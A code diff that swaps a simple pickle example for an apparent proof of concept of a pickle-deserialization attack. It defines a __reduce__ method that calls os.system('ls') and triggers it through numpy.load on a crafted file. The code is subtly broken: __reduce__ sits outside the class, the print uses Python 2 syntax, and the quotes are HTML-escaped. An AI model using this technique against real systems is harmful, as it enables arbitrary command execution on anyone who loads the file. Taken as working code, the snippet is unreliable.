@@ -1,6 +1,16 @@
-import pickle 
+import numpy
+from numpy import __version__
+print __version__
+import os
+import  pickle
+class Test(object):
+    def __init__(self):
+        self.a = 1
 
-student_names = ['Alice','Bob','Elena','Jane','Kyle']
+def __reduce__(self):
+    return (os.system,(&#39;ls&#39;,))
 
-with open('student_file.pkl', 'wb') as f:  # open a text file
-    pickle.dump(student_names, f) # serialize the list
+tmpdaa = Test()
+with open("a-file.pickle",'wb') as f:
+    pickle.dump(tmpdaa,f)
+numpy.load('a-file.pickle')
